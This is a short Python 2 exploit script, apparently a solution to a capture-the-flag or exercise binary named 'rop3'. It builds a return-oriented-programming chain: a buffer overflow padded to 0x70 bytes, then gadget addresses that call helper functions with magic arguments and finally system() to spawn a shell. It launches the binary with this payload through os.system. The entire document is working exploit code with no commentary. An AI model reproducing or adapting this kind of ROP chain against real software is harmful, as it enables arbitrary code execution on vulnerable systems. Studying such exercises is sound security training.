#!/usr/bin/env python2

import os, struct

add_bin = 0x08048441
popret  = 0x080482d5
bin_arg = 0xdeadbeef
add_sh  = 0x0804847c
poppopret = 0x08048479
sh_arg1 = 0xcafebabe
sh_arg2 = 0x0badf00d
system  = 0x0804842B
padding = 'AAAA'
sys_arg = 0x0804985D


payload = 'A'*0x70
payload += struct.pack('<I', add_bin)
payload += struct.pack('<I', popret)
payload += struct.pack('<I', bin_arg)
payload += struct.pack('<I', add_sh)
payload += struct.pack('<I', poppopret)
payload += struct.pack('<I', sh_arg1)
payload += struct.pack('<I', sh_arg2)
payload += struct.pack('<I', system)
payload += 'AAAA' # padding
payload += struct.pack('<I', sys_arg)

os.system('./rop3 \"%s\"' % payload)
